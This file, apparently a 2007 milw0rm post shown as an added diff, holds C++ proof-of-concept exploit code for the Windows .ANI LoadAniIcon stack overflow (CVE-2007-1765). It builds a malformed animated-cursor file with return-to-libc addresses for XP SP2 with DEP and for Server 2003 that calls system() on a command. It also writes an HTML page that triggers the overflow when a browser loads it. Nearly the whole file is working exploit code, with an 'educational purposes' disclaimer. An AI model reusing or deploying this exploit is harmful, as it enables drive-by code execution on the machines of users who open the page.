@@ -1,0 +1,169 @@
+/*
+* version 0.5
+* Copyright (c) 2007 devcode
+*
+*
+*			^^ D E V C O D E ^^
+*
+* Windows .ANI LoadAniIcon Stack Overflow For Hardware DEP XP SP2
+* [CVE-2007-1765]
+*
+*
+* Description:
+*    A vulnerability has been identified in Microsoft Windows,
+*    which could be exploited by remote attackers to take complete
+*    control of an affected system. This issue is due to a stack overflow
+*    error within the "LoadAniIcon()" [user32.dll] function when rendering
+*    cursors, animated cursors or icons with a malformed header, which could
+*    be exploited by remote attackers to execute arbitrary commands by
+*    tricking a user into visiting a malicious web page or viewing an email
+*    message containing a specially crafted ANI file.
+*
+* Hotfix/Patch:
+*    None as of this time.
+*
+* Vulnerable systems:
+*	  Microsoft Windows 2000 Service Pack 4
+*	  Microsoft Windows XP Service Pack 2
+*	  Microsoft Windows XP 64-Bit Edition version 2003 (Itanium)
+*	  Microsoft Windows XP Professional x64 Edition
+*	  Microsoft Windows Server 2003
+*	  Microsoft Windows Server 2003 (Itanium)
+*	  Microsoft Windows Server 2003 Service Pack 1
+*	  Microsoft Windows Server 2003 Service Pack 1 (Itanium)
+*	  Microsoft Windows Server 2003 x64 Edition
+*	  Microsoft Windows Vista
+*
+*	  Microsoft Internet Explorer 6
+*	  Microsoft Internet Explorer 7
+*
+* Tested on:
+* 	 Microsoft XP SP2 + DEP + Internet Explorer 6
+*
+*    This is a PoC and was created for educational purposes only. The
+*    author is not held responsible if this PoC does not work or is
+*    used for any other purposes than the one stated above.
+*
+*	Credit goes to HOD (if he/they exist :P) for the html. Works on
+*    XP SP2 with Hardware DEP enabled, go figure.
+*
+*    ^^ shoutz to Wonk(if he exists r0fl), InTeL, thrasher :)
+*
+*
+*/
+#include <iostream>
+#include <windows.h>
+
+/* ANI Header */
+unsigned char uszAniHeader[] =
+"\x52\x49\x46\x46\x00\x04\x00\x00\x41\x43\x4F\x4E\x61\x6E\x69\x68"
+"\x24\x00\x00\x00\x24\x00\x00\x00\xFF\xFF\x00\x00\x0A\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x10\x00\x00\x00\x01\x00\x00\x00\x54\x53\x49\x4C\x03\x00\x00\x00"
+"\x10\x00\x00\x00\x54\x53\x49\x4C\x03\x00\x00\x00\x02\x02\x02\x02"
+"\x61\x6E\x69\x68\xA8\x03\x00\x00";
+
+/* system("calc.exe"); */
+char szExecute[] = "logoff.exe\x00";
+
+unsigned char uszHtml[] =
+"<html>"
+"Microsoft Windows .ANI LoadAniIcon Exploit"
+"<br>Copyright (c) 2007 devcode<br>"
+"<style>" \
+"* {CURSOR: url(\"poc.ani\")}</style></head>"
+"</html>";
+
+/* Usage: ani.exe 1*/
+char szIntro[] =
+"\n\t\tWindows .ANI LoadAniIcon Stack Overflow\n"
+"\t\t\tdevcode (c) 2007\n"
+"[+] Targets:\n"
+"\t(0) Kernel32.dll (ExitProcess)\n"
+"\t(1) Windows XP SP2 + DEP\n"
+"\t(2) Windows 2003 Server\n"
+"Usage: ani.exe <target>";
+
+/* RET2LIBC attack */
+typedef struct {
+	const char *szTarget;
+	/* kernel32.dll - set the proper stack frame
+		LEA EBP, DWORD PTR SS:[ESP+10]
+		SUB ESP, EAX
+		PUSH EBX
+		PUSH ESI
+		PUSH EDI
+		....
+		....
+		RETN
+	*/
+	unsigned char uszRet[5];
+	/* msvcrt.dll - system() */
+	unsigned char uszMsvcrtCall[5];
+} TARGET;
+
+TARGET targets[] = {
+	{ "Kernel32.dll (ExitProcess)", "\x90\x90\x90\x90", "\x90\x90\x90\x90" },
+	{ "Windows XP SP2", "\xD6\x24\x80\x7C", "\xC7\x93\xC2\x77" },
+	{ "Windows 2003 Server", "\x0A\x17\xE4\x77", "\x10\x8C\xBB\x77" }
+};
+
+int main( int argc, char **argv ) {
+	char szBuffer[1024];
+	FILE *f;
+	void *pExitProcess[4];
+
+	if ( argc < 2 ) {
+		printf("%s\n", szIntro );
+		return 0;
+	}
+
+	if ( atoi( argv[1] ) == 0 ) {
+		printf("[+] Getting ExitProcess address...\n");
+		*pExitProcess = GetProcAddress( GetModuleHandle( "kernel32.dll" ), 
+"ExitProcess" );
+		if ( pExitProcess == NULL ) {
+			printf("[-] Cannot get ExitProcess address\n");
+			return 0;
+		}
+		memcpy( targets[1].uszRet, pExitProcess, 4 );
+	}
+
+	printf("[+] Creating ANI header...\n");
+	memset( szBuffer, 0x90, sizeof( szBuffer ) );
+	memcpy( szBuffer, uszAniHeader, sizeof( uszAniHeader ) - 1 );
+
+	printf("[+] Copying execution code...\n");
+	memcpy( szBuffer + 168, targets[atoi( argv[1] )].uszRet, 4 );
+	memset( szBuffer + 136, 0, 4 );
+	memset( szBuffer + 204, 0, 4 );
+	szBuffer[136] = 0x6C;
+	szBuffer[204] = 0x6C;
+	memcpy( szBuffer + 196, targets[atoi(argv[1])].uszMsvcrtCall, 4 );
+	memcpy( szBuffer + 200, targets[atoi(argv[1])].uszMsvcrtCall, 4 );
+	memcpy( szBuffer + 240, szExecute, sizeof( szExecute ) - 1 );
+
+	f = fopen( "poc.ani", "wb" );
+	if ( f == NULL ) {
+		printf("[-] Cannot create ani file\n");
+		return 0;
+	}
+
+	fwrite( szBuffer, 1, 1024, f );
+	fclose( f );
+	printf("[+] .ANI file succesfully created!\n");
+
+	f = fopen( "poc.html", "wb" );
+	if ( f == NULL ) {
+		printf("[-] Cannot create html file\n");
+		return 0;
+	}
+
+	fwrite( uszHtml, 1, sizeof( uszHtml ), f );
+	fclose( f );
+	printf("[+] HTML file succesfully created!\n");
+
+	return 0;
+}
+
+// milw0rm.com [2007-04-03]
